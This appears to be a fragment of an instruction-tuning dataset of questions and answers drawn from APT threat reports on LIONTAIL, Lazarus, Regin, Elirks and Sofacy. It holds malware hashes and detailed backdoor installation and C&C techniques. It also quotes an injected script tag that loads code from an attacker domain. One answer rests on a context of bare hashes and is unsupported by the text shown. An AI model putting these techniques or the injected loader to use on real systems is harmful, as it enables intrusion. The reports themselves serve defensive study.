6E24C2403DAFAE05C351C5A0A16E2B6403E0F398 09EA7B2F67797915BBFED16F0B21E4E31F4980A3 0AA48DEE8F528B037D8D72AAD039BB2759F362E3 40D7D09053BF60925CBB820417A42DBC6293E017 A6600BD9752E041ED7EE026123A60B19C96259AB 506CCEBDAC5754D1E20D9C3FB280CEC7782EEA6E 40F33CD2AD98FE1E6BF4AB199021498F9E3125A1 9F03A4E0ACD38635104292B8054485E6BF898C48 B373BF4B3AA28FF6D373DA5EAA848AF9772F6454 FD83C2484E2986F22B09623E5971AA54FBD8BCD3 065B075293968732F2BE433B7B492869E4260EE5 B358687593FEBDFD0E1858726098DCFD61D9F8B5 FD2FBB8E4676673A35276B46F2C74562703BCF39 CCD19FD4A1408FCD855B7909578340846904E707 9D84665C00F81C2835E2A41711A139547351D850 69536CAF0522C1A915D6AC4C65177A26EFA7944B 243421FE7C1FC007EFA0C9CCAB6F6E2A0C94FCC2 5B7D6D7C3C4AD74A7F1E32B780776DB41FF18DDD 4418A32BBD215F5DE7B0063B91731B71804E7225 EE1E5D95FCAD429126944804D80D7C2412AF492E E494328255EF2B9ED9B332EE845513A93339217F 6B53A3A3CB9D87D5925C82839015DAD16042C2FF\nMedium Headline: Prikormka CORE modules:\n2A64606DB1DB872E7176F0C6C3FF932E2146BFC9 328DE44A4B6140EF49CE1465482EFE0E4C195399 520AA689066D0C69F6FD9C623E263211022CCF21 790367A2032951488FC6F56DCF12062AE56CAA61 551CD9D950A9C610E12451550BD6A3FBF5B00B77 EF3244AB1DF7D74F1FC1D8C3AF26A3D3EA4364A5 1636112D8441A6616B68CBE9DC32DDB5D836BBA1 8A57E5EED18A6DB6F221B1B9E8831FE4A9CAD08C DCB813E5D2A1C63027AADC7197FD91505FD13380 A360EAC305946FF468E1A33E84ED38176D95CAC9 8F67C4BD2EE7C68249DCD49AD7A3924D3EC6810C C020EFFD3C7AD06907ECFEA424BE1DCB60C7447D D2A98115DF0C17648CCB653AF649D24B528B471D D7EEB8DB22AAD913B38E695A470E8B2F1440D4D3 154AA820D552ABD65C028DED7E970C8DEFA8C237 83B492A2905CE6ACFADE43AB52BF52E6F02FDCD5\n4F945A3B3EB058668C3DFC0A8469B42E16C277A7 963963004E4CA0D966D84324EC8ED3694F6A7F5B 9DE8860AD499E64F8BDCFC800DDAFF49D4F948E5 C9C2510654081D621A5B1768520D7D7C04219FCB 9D025A015FDB720C0FDEBCFE54661F3ACED94E3E D09B6194453BFC59EB438E455D14621B280DF4A6 1A865E934EFF339A826979C70A2FC055E3C9D12F 4C5F412C915FB3F178A81BC4FBDA336F69A22086 7372639A9E5C274DFFAA35ABF4C8E7A0BEBD4305 311672ECB756E52AD396227DD884D1C47234961A 7A22E549BE02F7F4753BB9CBA34079CEB15CA381 6AB00FCABC6BC06586F749F54C4955592285608C 66248AE0A3D6B5091C629343CC535F98E08A2947 0DD8E1922CEB96061C9F6678728DD45CBDC6F675 A093993B9488A9427300B2AC41460BE8164A0F9A 6D861826206D834A224583898BE6AF1A3D46E7CF 64679BDB8A65D278CDA0975F279D8881E1ABD40A 92476C6AE5F976C58D11BDD956878451F361776D 202637EF3C9B236D62BE627C6E1A8C779EB2976B C41BB97C203D6221FB494D732CB905FF37376622 986E739948E3B5C303F7766F9F9AF3D2E1A5BCA7 3AB61FEC417686AFC1AC430AAF5A17254D05A14A 0D7785E53AB1A7F43902AFF50E7A722C0E0B428F B5EEAE045F1082438E4C7B7F12F7F4630043A48E 57E345893F508F390F2947E83092A47D845EA445 C9756E95679EAD052D53ADCFA39BB4B1402C9126 D864067BFA52383BC012BA1AAF8FFB893D419C07 CDD58347F873EB7E0BC602DA9930A519683C67C7 DFABE31E58334C873AEDD361D69D5C80016F9F42 625D822EE0D95C6E581B929C6C4E4B44D749D2BB A224A76DABE62BD7CA055CA1119108AD5812AF06 E4C56D11E84497EEC3E275043E36845EB2F3F57E B43713CBD307BC12AD7BA61C87975F74221A3439 AED9C3BCA2B42889A9110B92D3D31B5FD3324BDF 6AE2C768D932EDA538983DD7A50CF7DE14BF54D2\nn7C6FA82657B291FAFE423B7B45D0ED732F4D5352 4595EAB593594860985F5FB501B85386F1F1A5B8 45F1F06C3A27CE8329E2BDCDEEA3C530711B5B72 476DCA86DE7AF1F15327084021A3BB7F42818248 70A362985D5237ACD6282E16A238B0FDB1002A1F 73596D1587549DC234588FCB5666BEEFD7C90D81 97958B3124EC5DCAB64DD88A1E97E6B585B04628 B47640C4952ACC2705F7EAD9E8EAA163059FD659 596F945AB52AE0E780905E150ACD2017AB2ECDFC 5CEFFF9C7D016364D40F841CB74D65BB478BA0C6 424DD485FA8572DB84CF6845C27C1F8679A61AEC 099C5611F3BDBB8D453DFBF7967F30891906FF2C 7C2587B85178AD89389D957F11AF1065C46F66DB 840AFB728FDA57195E53F225CB3F6E788B96A579 12ACC64605D4FE2F3CEEEFBD0A7C4FD655E6AEAA\n\nBased on the above text, answer a question. Why is it significant that Operation Groundbait is the first publicly known Ukrainian malware used in targeted attacks? How does this finding impact the broader understanding of cyber threats in the region?",
    "output": "The significance of Operation Groundbait being the first publicly known Ukrainian malware used in targeted attacks lies in its implications for the cyber threat landscape in the region. This discovery highlights that even less technologically advanced malware can be effective if used strategically. It underscores the importance of not underestimating simpler threats and emphasizes the need for robust cybersecurity measures that can detect and mitigate both sophisticated and basic attacks. This finding also indicates that cyber espionage is a prevalent tactic in areas of armed conflict, necessitating heightened vigilance and preparedness.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Link to previous attack campaign\nUnit 42 previously identified an Elirks variant during our analysis of the attack campaign called (<https://www.paloaltonetworks.com/resources/research/scarlet-mimic>)Scarlet Mimic. It is years-long campaign targeting minority rights activists and governments. The malware primarily used in this series of attacks was FakeM. Our researchers described the threat sharing infrastructure with Elirks in the report.\nAs of this writing, we can note similarities between previously seen Elirks attacks and this recent case in Japan.\nBig Headline: Airline E-Ticket\nAttackers choose a suitable file name to lure targeted individual or organization. In the recent case, the malicious attachment name in the email was reported as \"E-TKT\". We found similar file name in the previous attack in Taiwan in August 2012 (Figure 5).\nWhen opening the file, Elirks executes itself on the computer and creates ticket.doc to deceive users (Figure 6).\nWe've also seen another file name related to aviation at Taiwan in March 2012. Figure 7 shows PDF file named \"Airline Reservation Numbers (updated version).pdf\". When opening the PDF file, it displays the exactly same message with the Figure4, exploits CVE-2011-0611 and installs Elirks.\nFigure 7 PDF named \"Airline Reservation Number\"\nBig Headline: Conclusion\nCurrently, we have found no reliable evidence to indicate the same adversary attacked a company in Japan in 2016 and multiple organizations in Taiwan in 2012. However, we can see some resemblances between the two attacks. In both cases, attackers used the same malware family, crafted spear phishing emails in a similar manner, and seem to be interested in some areas related to aviation. We have been seeing multiple Elirks variants targeting Japan in the last few years, potentially indicating an ongoing cyber espionage campaign. We will keep an eye on the threat actors.\nPalo Alto Networks customers are protected from Elirks variant and can gather additional information using the following tools:\nWildFire detects all known Elirks samples as malicious\nAll known C2s are classified as malicious in PAN-DB\nAutoFocus tags have been created: (<https://autofocus.paloaltonetworks.com/#/tag/Unit42.Elirks>)Elirks\n\nQuestion: What are the key similarities between the Elirks attacks in Japan and the previous attacks in Taiwan, and how do these similarities suggest potential ongoing cyber espionage campaigns?\n\nAnswer:",
    "output": "The key similarities between the Elirks attacks in Japan and the previous attacks in Taiwan include the use of the same malware family (Elirks), the crafting of spear phishing emails in a similar manner, and an interest in areas related to aviation. For example, both attacks used file names related to airline tickets and reservations to lure victims. These resemblances suggest that the attackers might be part of an ongoing cyber espionage campaign targeting specific sectors or regions. While there is no definitive evidence linking the same adversary to both attacks, the consistent tactics and targets indicate a pattern that warrants continued monitoring and analysis.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Lazarus APT leverage the KernelCallbackTable for control flow hijacking in its recent campaign? Explain the process in detail.",
    "output": "The Lazarus APT uses the KernelCallbackTable for control flow hijacking by first making a call to NtQueryInformationProcess with ProcessBasicInformation class as the parameter. This allows the malware to retrieve the address of the Process Environment Block (PEB), which contains the KernelCallbackTable pointer. The KernelCallbackTable is initialized to an array of callback functions when user32.dll is loaded into memory, and these functions are used whenever a graphical call (GDI) is made by the process. The malware replaces the USER32!_fnDWORD callback in the table with the malicious WMIsAvailableOffline function. Once the flow is hijacked and the malicious code is executed, the rest of the code restores the KernelCallbackTable to its original state.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: LIONTAIL Framework\nLIONTAIL is a malware framework that includes a set of custom shellcode loaders and memory resident shellcode payloads. One of its components is the LIONTAIL backdoor, written in C. It is a lightweight but rather sophisticated passive backdoor installed on Windows servers that enables attackers to execute commands remotely through HTTP requests. The backdoor sets up listeners for the list of URLs provided in its configuration and executes payloads from requests sent by attackers to those URLs.\nThe LIONTAIL backdoor components are the main implants utilized in the latest Scarred Manticore intrusions. Utilizing access from a publicly facing server, the threat actor chains a set of passive implants to access internal resources. The internal instances of the LIONTAIL\nbackdoors we've seen so far either listen on HTTP(s), similar to the internet-facing instances, or in some cases use named pipes to facilitate remote code execution.\nMedium Headline: Installation\nWe observed 2 methods of backdoor installation on the compromised Windows servers: standalone executables, and DLLs loaded through search order hijacking by Windows services or legitimate processes.\nWhen installed as a DLL, the malware exploits the absence of some DLLs on Windows Server OS distributions: the backdoor is dropped to the system\nfolder C:\\windows\\system32 as wlanapi.dll or wlbsctrl.dll. By default, neither of these exist on Windows Server installations. Depending on the Windows Server version, the malicious DLL is then loaded either directly by other processes, such as Explorer.exe, or the threat actors enable specific services, disabled by default, that require those DLLs.\nIn the case of wlbsctrl.dll, the DLL is loaded at the start of the IKE and AuthIP IPsec Keying Modules service. For wlanapi.dll, the actors enable Extensible Authentication Protocol:\nsc.exe config Eaphost start=auto sc.exe start Eaphost\nIn instances where LIONTAIL is deployed as an executable, a noteworthy characteristic observed in some is the attempt to disguise the executable as Cyvera Console, a component of Cortex XDR.\nMedium Headline: Configuration\nThe malware starts by performing a one-byte XOR decryption of a structure containing the malware configuration, which is represented with the following structure:\nQWORD var_0\nQWORD var_8\nQWORD magic_number\nDWORD num_of_end_string\nDWORD num_of_listen_urls\nSTRING end_string\nSTRING[] listen_urls\nThe field listen_urls defines particular (<https://learn.microsoft.com/en-us/windows/win32/http/urlprefix-strings>)URL prefixes to which the malware listens for incoming requests.\nAll of the samples' URL lists include the http://+:80/Temporary_Listen_Addresses/ URL prefix, a default that allows any user to receive messages from this URL. Other samples include multiple URLs on ports 80, 443, and 444 (on Exchange servers) mimicking existing services, such as:\nhttps://+:443/autodiscover/autodiscovers/\nhttps://+:443/ews/exchanges/ https://+:444/ews/ews/\nMany LIONTAIL samples contain tailor-made configurations, which add multiple other custom URLs that match existing web folders on the compromised server. As the URLs for the existing folders are already taken by the actual IIS service, the generated payloads contain additional random dictionary words in the path. These ensure the malware communication blends into legitimate traffic, helping to make it more inconspicuous.\nThe host element of all prefixes in the configuration consists of a single plus sign (+), a \"strong wildcard\" that matches all possible host names. A strong wildcard is useful when an application needs to serve requests addressed to one or more relative URLs, regardless of how those requests arrive on the machine or what site (host or IP address) they specify in their Host headers.\nTo understand how the malware configures listeners on those prefixes and how the approach changes with time, we pause for a short introduction to the Windows HTTP stack.\nMedium Headline: Windows HTTP Stack components\nA port-sharing mechanism, which allows multiple HTTP services to share the same TCP port and IP address, was introduced in Windows Server 2003. This mechanism is encapsulated within HTTP.sys, a kernel-mode driver that assumes the responsibility of processing HTTP requests, listens to incoming HTTP requests, and directs them to the relevant user-mode processes or services for further handling.\nOn top of the driver layer, Windows provides the , a user-mode component that provides the interface for interacting with HTTP.sys. In addition, the Internet Information Services (IIS) under the hood relies on HTTP API to interact with the HTTP.sys driver. In a similar fashion, the (<https://learn.microsoft.com/en-us/dotnet/api/system.net.httplistener?view=net-8.0>)HttpListener class within the .NET framework is a simple wrapper around the HTTP Server API.\nFigure 2 \u2013 Schema of HTTP stack components on Windows Servers ().\nThe process of receiving and processing requests for specific URL prefixes by an application (or, in our case, malware) can be outlined as follows:\n1. The malware registers one or more URL prefixes with HTTP.sys by any of the means provided by the Windows operating system.\n2. When an HTTP request is received, HTTP.sys identifies the application associated with the request's prefix and forwards the request to the malware if it's responsible for that prefix.\n3. The malware's request handler then receives the request intercepted by HTTP.sys and generates a response for it.\nMedium Headline: C&C Communication\nAfter extracting the configuration, the malware uses the same one-byte XOR to decrypt a shellcode responsible for establishing the C&C communication channel by listening to the provided URL prefixes list. While the concept of passive backdoors on web-facing Windows servers is not new and was in the wild hijacking the same Windows DLL wblsctrl.dll as early as 2019 (by Chinese-linked (<https://securelist.com/operation-shadowhammer/89992/>)Operation ShadowHammer), the\nLIONTAIL developers elevated their approach. Instead of using the HTTP API, the malware uses IOCTLs to interact directly with the underlying HTTP.sys driver. This approach is stealthier as it doesn't involve IIS or HTTP API, which are usually closely monitored by security solutions, but is not a straightforward task given that the IOCTLs for HTTP.sys are undocumented and require additional research efforts by the threat actors.\nFirst, the shellcode registers the URL prefixes with HTTP.sys using the following IOCTLs:\n0x128000 \u2013 UlCreateServerSessionIoctl \u2013 Creates an HTTP/2.0 session.\n0x128010 \u2013 UlCreateUrlGroupIoctl \u2013 Creates a new UrlGroup. UrlGroups are configuration containers for a set of URLs created under the server session and inherit its configuration settings.\n0x12801d \u2013 UlSetUrlGroupIoctl \u2013 Associates the UrlGroup with the request queue by setting HttpServerBindingProperty.\n0x128020 \u2013 UlAddUrlToUrlGroupIoctl \u2013 Adds the array of listen_urls to the newly created UrlGroup.\nAfter registering the URL prefixes, the backdoor initiates a loop responsible for handling the incoming requests. The loop continues until it gets the request from a URL equal to the end_string provided in the backdoor's configuration.\nThe backdoor receives requests from HTTP.sys using 0x124036 \u2013\nUlReceiveHttpRequestIoctl IOCTL.\nDepending on the version of the compromised server, the body of the request is received using 0x12403B \u2013 UlReceiveEntityBodyIoctl or (if higher than 20348) 0x12403A \u2013 UlReceiveEntityBodyFastIo. It is then base64-decoded and decrypted by XORing the whole data with the first byte of the data. This is a common method of encryption observed in (<https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-264a>)multiple malware families, including but not limited to DEV-0861's web-deployed Reverse proxy.\nThe decrypted payload has the following structure:\nQWORD shellcode_size\n_BYTE[] shellcode\nQWORD shellcode_output (should be 0 in the incoming msg)\nQWORD shellcode_output_size (should be 0 in the incoming msg)\nQWORD MAGIC_NUM (has to be 0x18)\n_BYTE[] argument\nThe malware creates a new thread and runs the shellcode in memory. For some reason, it uses shellcode_output and shellcode_output_size in the request message as pointers to the respective data in memory.\nTo encrypt the response, the malware chooses a random byte, XOR-encodes the data using it as a key, prepends the key to the result, and then base64-encodes the entire result before sending it back to the C&C server using the IOCTL 0x12403F \u2013 UlSendHttpResponseIoctl.\nMedium Headline: LIONTAIL web shell\nIn addition to PE implant, Scarred Manticore uses a web shell-based version of the LIONTAIL shellcode loader. The web shell is obfuscated in a similar manner to other Scarred Manticore .NET payloads and web shells.\nThe web shell gets requests with 2 parameters:\nThe shellcode to execute.\nThe argument for the shellcode to use.\nBoth parameters are encrypted the same way as other communication: XOR with the first byte followed by base64 encoding.\nThe structure of shellcodes and of arguments sent to the web shell-based shellcode loader is identical to those used in the LIONTAIL backdoor, which suggests that the artifacts observed are part of a bigger framework that allows the dynamic building of loaders and payloads depending on the actor's access and needs.\nQuestion: What is the role of the LIONTAIL web shell in Scarred Manticore's operations, and how does it relate to the overall LIONTAIL framework?",
    "output": "Answer: The LIONTAIL web shell serves as an alternative method for executing shellcode, complementing the PE implant used by Scarred Manticore. The web shell is obfuscated similarly to other Scarred Manticore .NET payloads and web shells. It receives requests with two parameters: the shellcode to execute and the argument for the shellcode. Both parameters are encrypted using XOR with the first byte followed by base64 encoding, mirroring the encryption method used in other LIONTAIL communications. The structure of shellcodes and arguments sent to the web shell is identical to those used in the LIONTAIL backdoor, indicating that these artifacts are part of a larger framework. This framework allows dynamic building of loaders and payloads based on the actor's access and needs, providing flexibility and adaptability in their operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 3. ConClUsions\nOur analysis of the Regin's stage #1, as detailed in this document, shows that this component of the Regin framework is designed to retrieve an additional payload (stage #2) from an already compromised system, map it into kernel memory and execute it.\nDuring the loading process, Regin's stage #1 will hide the payload's invocations of function exported by other modules using an unusual 'trampoline' mechanism. In this way, the malware manages to effectively fool an external observer into thinking that calls to API functions are being performed by one of a set of 'trusted' modules, thereby allaying suspicion of the payload's activities.\nThe utilitarian nature of the malware makes it obvious that this is a support module, designed to hide the presence of an additional stage.\nAttempting attribution based on this single component is particularly challenging, as Regin's stage #1 is purely a support module, with very little content other than executable code. In the case of the \"augmented\" samples, the benign device driver used as a base offers little to nothing in terms of information that could help identifying the author(s).\nThat said, based on the code structure, we suspect that Regin's developers may be experienced and skilled. Statistical analysis of the 27 samples in our collection suggest that the three different types of stage #1 samples we identified may have been the product of iterative development.\nThe fact that the malware supports even Windows NT4 targets suggests that this malware is designed to work against a wide set of targets, each running different versions of the Windows operating system in their environment. We believe however that at some point the attackers directed their efforts towards machines running Windows NT 5.2.3790, also known as Windows Server 2003.\n\nQ: How does Regin's stage #1 component manage to conceal the invocation of API functions by its payload, and what implications does this have for detecting its activities?",
    "output": "A: Regin's stage #1 component employs an unusual 'trampoline' mechanism to hide the payload's invocations of functions exported by other modules. This technique effectively misleads external observers into believing that API function calls are being made by trusted modules, thereby reducing suspicion of the payload's activities. By doing so, the malware can operate more stealthily, making it harder for security systems and analysts to detect and attribute its actions. This approach highlights the sophisticated nature of the malware and the experience of its developers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: PREDICTIONS\nGrowing numbers of attacks against financial organizations, financial fraud on exchange markets\nIn the coming year, we expect to see growing numbers of attacks launched against financial organizations, as well as a difference in the quality of these attacks. Besides transferring money to their own accounts and converting it to cash, we may also see cybercriminals employing some new techniques. These could include data manipulation on trading platforms where both traditional and new financial instruments, such as cryptocurrencies, are traded.\nAttacks on infrastructure\nEven if an organization is difficult to penetrate, it is now typical for organizations to store their valuable data on servers located in data centers rather than on the infrastructure located on their own premises. Attempts to gain unauthorized access to these outsourced components of a company's infrastructure will become an important attack vector in 2016.\nExploiting IoT vulnerabilities to penetrate corporate networks\nIoT (Internet of Things) devices can be found in almost every corporate network. Research conducted in 2015 has shown that there are a number of security problems with these devices and cybercriminals are likely to exploit them because they offer a convenient foothold at the initial stage of penetrating a corporate network.\nMore rigid security standards, cooperation with law enforcement agencies\nIn response to the growing number of computer incidents in business environments and the changes to the overall cyber-threat landscape, regulatory authorities will develop new security standards and update those already in effect. Organizations that are interested in the integrity and security of their digital values will cooperate more actively with law enforcement agencies, or find themselves obliged to do so by the standards mentioned above. This may lead to more concerted efforts to catch cybercriminals, so expect to hear about new arrests in 2016.\nBig Headline: WHAT TO DO?\nIn 2015, we have seen cybercriminals begin to actively use APT attack methods to penetrate company networks. We are talking here about reconnaissance that aims to identify weak spots in a corporate infrastructure and gathering information about employees. There is also the use of spear phishing and waterhole attacks, the active use of exploits to execute code and gain administrator rights, the use of legitimate software along with Trojans for remote administration, research of the targeted network and abuse of password restoration software. All this requires the development of methods and techniques to protect corporate networks.\nAs for specific recommendations, the  developed by the Australian Signals Directorate (ASD) should be consulted first of all. Through comprehensive, detailed analysis of local attacks and threats, ASD has found that at least 85% of targeted cyber intrusions could be mitigated by four basic strategies. Three of them are related to specialized security solutions. Kaspersky Lab products include technological solutions to cover the first three major strategies.\nBelow is a list of the four basic strategies that reduce the possibility of a successful targeted attack:\n\u2022 Use application whitelisting to help prevent malicious software and unapproved programs from running\n\u2022 Patch applications such as Java, PDF viewers, Flash, web browsers and Microsoft Office\n\u2022 Patch operating system vulnerabilities\n\u2022 Restrict administrative privileges to operating systems and applications, based on user duties.\nFor detailed information about the ASD mitigation strategies, consult the  in the Securelist encyclopedia.\nAnother important factor is the use of the latest threat data, i.e. threat intelligence services (Kaspersky Lab, for example, provides its own ). A timely configuration and checkup of the corporate network using this data will help protect against attacks or detect an attack at an early stage.\nThe basic principles of ensuring security in corporate networks remain unchanged:\n\u2022 Train staff. Maintaining information security is not only the job of the corporate security service but also the responsibility of every employee.\n\u2022 Organize security procedures. The corporate security system must provide an adequate response to evolving threats.\n\u2022 Use new technologies and methods. Each added layer of protection helps reduce the risk of intrusion.\n\nWhy are cybercriminals expected to target financial organizations with new techniques involving data manipulation on trading platforms, and how can these attacks be mitigated according to the report?",
    "output": "A: Cybercriminals are expected to target financial organizations with new techniques involving data manipulation on trading platforms because these platforms handle both traditional and new financial instruments, such as cryptocurrencies, which present lucrative opportunities for fraud. To mitigate these attacks, organizations should implement comprehensive security measures including application whitelisting, patching applications and operating systems, restricting administrative privileges, and using the latest threat intelligence services. Additionally, training staff, organizing security procedures, and adopting new technologies and methods can help reduce the risk of intrusion.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Democracy in Hong Kong Under Attack\nPosted on , 2014 by\nOver the last few months, Volexity has been tracking a particularly remarkable advanced persistent threat (APT) operation involving strategic web compromises of websites in Hong Kong and Japan. In both countries, the compromised websites have been particularly notable for their relevance to current events and the high profile nature of the organizations involved. In particular the Hong Kong compromises appear to come on the heels of the (<https://en.wikipedia.org/wiki/Occupy_Central_with_Love_and_Peace>)py Central Campaig shifting into high gear. These compromises were discovered following the identification of malicious JavaScript that had been added to legitimate code on the impacted websites. This code meant that visitors were potentially subjected to exploit and malicious Java Applets designed to install malware on their systems. While investigating these cases, Volexity also discovered additional APT attack campaigns involving multiple other pro-democratic websites in Hong Kong. These attempts at exploitation, compromise, and digital surveillance are detailed throughout this post.\nCompromised Pro-Democratic Hong Kong Websites\nWarning: Many of these websites may still be compromised and present a risk to visitors. Browse with caution.\nAlliance for True Democracy \u00e2\u20ac\" Hong Kong\nOver the last two days, Volexity has observed malicious code being served up from the website of the Alliance for True Democracy (ATD) in Hong Kong (www.atd.hk). ATD is an alliance of people and organizations dedicated to democracy and universal suffrage in Hong Kong. At the time of this writing malicious code is still live on the website, so please visit with care until the website is clean. Below is a screen shot of the malicious code references found pre-pended to a JavaScript file on the website named superfish.js.\nThis JavaScript file is called from other parts of the website and effectively nests the loading of additional JavaScript written and interpeted as:\n<script language=javascript src=http://java-se.com/o.js</script>\nThe domain name java-se.com is known bad and associated with APT activity. At the time of this post, the domain is hosted on the Japanese IP address 210.253.101.105.\n7506 | 210.253.96.0/20 | INTERQ | JP | GMO.JP | GMO INTERNET INC.\nVolexity has yet to actually see the contents of the file o.js, as the websites has continuously returned HTTP 403 responses each time it was requested. The file was requested from IP addresses throughout Asia without ever returning valid content. It's unclear if this code is activated at certain times or if there is a whitelist of IPs restricting access to the file to specific targets. This same code has also been observed being served from another Hong Kong website described in the next section.\nWebshell Backdoor\nWhile examining the ATD website, Volexity also observed that the site had a password protected backdoor webshell placed on it. This is a fairly popular webshell that Volexity has encountered on several occasions when dealing with website compromises. Volexity refers to this shell as the Angel Webshell, named after its default password of \"angel\u00e2\u20ac\u200b. The shell will simply display the text \"Password:\u00e2\u20ac\u200b, a text input box, and a Login button. A screen shot of the webshell as observed on the ATD website can\nbe seen below.\nDespite the shell being written in PHP and only displaying a simple Login prompt, it is easy to identify the Angel webshell based on unique components of its viewable HTML source code. The HTML source of this page is displayed in the following image.\nWhile Volexity operates under the assumption attackers have placed webshells on webservers they have compromised, in this particular instance it can be seen with certainty. Attackers will often upload new webshells or add simple China Chopper style modifications to legitimate existing files in an attempt to maintain persistence to these systems.\nRead the text above and answer this question: Why did Volexity consider the APT operation involving strategic web compromises in Hong Kong and Japan particularly remarkable? What specific tactics were employed by the attackers to compromise these websites, and how did these tactics relate to current events in the region?",
    "output": "Volexity considered the APT operation remarkable due to the strategic nature of the compromised websites in Hong Kong and Japan, which were highly relevant to current events and involved high-profile organizations. The compromises in Hong Kong coincided with the Occupy Central Campaign gaining momentum. The attackers employed malicious JavaScript code added to legitimate code on the impacted websites, which could subject visitors to exploits and malicious Java Applets designed to install malware on their systems. This tactic allowed the attackers to potentially exploit, compromise, and digitally surveil visitors to these pro-democratic websites.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: ROOT9B RELEASES ZERO DAY HASHES\nCybersecurity experts are increasingly concerned about the threat posed by Russian hacking groups. Besides well-known events such as the attacks against Estonia, Georgia, and Ukraine; recent headlines have seen Russian hacking syndicates credited with targeting NATO officials at conferences, stealing hundreds of millions from banks, and successfully penetrating the White House unclassified computer network. The increase in cyber-exploits is also accompanied by a much more aggressive Russian foreign policy, which has seen them invade Ukraine and literally seize control of sovereign territory in Crimea.  So it should not surprise anyone that just as nuclear capable Russian bombers are increasingly penetrating foreign airspace, their cyber-warriors appear to be ramping up their intrusions as well. But this time, perhaps for the first time, root9B has managed to find where they were hiding and identified effective defenses against their intended attacks. This is what happened in late April and early May of this year.\nOur firm of cybersecurity experts, staffed by veterans from the United States Department of Defense, identified suspicious activity within one of our client's networks; a threat which on closer inspection bore the unique signature of a group of Russian hackers well-known in the cyber-security\nindustry. As Cyber Threat analysts continued to follow the indicators, they uncovered a global attack in the making, and took steps to protect not only our clients, but other identified victims as well.\nSofacy, Sednit, Sourface, APT-28, and a host of other names are all used to describe this particularly prolific and superbly talented group of Russian hackers, which has strongly suspected ties to Russian intelligence services.   In the last year alone Russian hackers have reportedly stolen up to 900 million dollars from banks around the world.  Over the past three to five years they have built the largest botnets ever discovered, and stolen the log-in and password credentials to literally\ntens of millions of online accounts. Well known for their ability to infiltrate and remain undiscovered in networks for long periods of time, they may be the most successful group of hackers in the world. Whereas previous attacks have been attributed and analyzed only after they have run their course, this was the first and only known Sofacy attack to be discovered, identified, and reported \u2013 all before it could even begin!  The analysts and tools that enabled this to happen are unique and proprietary. This report documents the first ever operation to use threat intelligence and adversary tactics to discover and reveal the prepositioning of Sofacy zero-day malware. This document also includes the reporting of previously unknown malware  indicators and hashes.\nQuestion: What makes the Sofacy group (APT-28) particularly notable among other hacking groups, and how have their activities evolved over the past few years?",
    "output": "Answer: The Sofacy group, also known by various names such as Sednit, Sourface, and APT-28, is notable for its prolific and highly skilled activities, with strong suspected ties to Russian intelligence services. They are well-known for their ability to infiltrate and remain undetected in networks for extended periods. Over the past three to five years, they have reportedly stolen up to 900 million dollars from banks worldwide, built the largest botnets ever discovered, and stolen login and password credentials for tens of millions of online accounts. Their activities have evolved to include high-profile targets such as NATO officials, banks, and even the White House unclassified computer network.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Infrastructure Connections to Malware Operations against Thai Government\nThe domain tibetonline[.]info was also identified by (<http://researchcenter.paloaltonetworks.com/2015/11/attack-campaign-on-the-government-of-thailand-delivers-bookworm-trojan/>)Palo Alto Networks as a command and control server used for FFRAT malware recently (<https://www.cylance.com/en_us/blog/breaking-down-ff-rat-malware.html>)described by Cylance. This infrastructure overlapped with servers used by a threat actor targeting Thai government entities with the Bookworm trojan in 2015. The general tactics, techniques, and procedures used by this threat actor also show similarities to the campaign we analysed. Both used the same hosting provider on one IP: Cloudie HK (103.226.127[.]47), and used fake Adobe updates to lure targets into installing malware. The threat actor documented by Palo Alto also used fake news site domains (e.g., vancouversun[.]us, yomiuri[.]us, voanews[.]hk, and nhknews[.]hk) Finally, both operations leveraged compromised web servers for command and control.\nMedium Headline: Certificate Connections to Malware Targeting Gaming Companies\nIn October 2016 Cylance (<https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies>)disclosed information on a threat actor called \"PassCV\", which targeted the gaming industry and used stolen code signing certificates to sign malware.\nThe disclosure was an update to information (<https://www.bluecoat.com/security-blog/2014-07-21/korean-gaming-industry-still-under-fire>)published by Symantec in July 2014 and Kaspersky's 2013 (<https://securelist.com/winnti-more-than-just-a-game/37029/>)view into Winnti.\nCylance lists three malware samples signed with one of the same certificates used to sign one of the Netwire dropper files in the operation we report on:\n57 BE 1A 00 D2 E5 9B DB D1 95 24 AA A1 7E D9\n3B\nIn addition, Cylance also notes the discovery of Netwire being used in the same campaign. The use of Netwire is notable as it is the only other mention of it being used in Chinese-nexus malware operations of which we are aware.\nThe disclosure was an update to information (<https://www.bluecoat.com/security-blog/2014-07-21/korean-gaming-industry-still-under-fire>)published by Symantec in July 2014 and Kaspersky's 2013 (<https://securelist.com/winnti-more-than-just-a-game/37029/>)view into Winnti.\nQ: How did the infrastructure used in the campaign targeting Chinese language news sites overlap with previous malware operations against the Thai government, and what specific tactics, techniques, and procedures were shared between these campaigns?",
    "output": "The infrastructure used in the campaign targeting Chinese language news sites overlapped with previous malware operations against the Thai government through the use of the domain tibetonline[.]info, which was identified as a command and control server for FFRAT malware. Both campaigns used the same hosting provider, Cloudie HK (103.226.127[.]47), and employed fake Adobe updates to trick targets into installing malware. Additionally, both operations utilized compromised web servers for command and control and created fake news site domains, such as vancouversun[.]us, yomiuri[.]us, voanews[.]hk, and nhknews[.]hk.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What role did Damballa play in identifying and analyzing the Aurora botnet, and how did their methods contribute to understanding the attack?",
    "output": "Damballa focused on detecting Command and Control (CnC) tethering and the malicious communications between victims' computers and remote criminal operators. They used key DNS observations about the operational characteristics of Dynamic DNS zones to identify different states of the botnet's operation. Damballa also reviewed historical DNS resolution data to determine when and how frequently the CnC domain names associated with the Aurora botnet were queried. This provided valuable insights into the pace at which victims joined the botnet and established a timeline for the Aurora attack.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
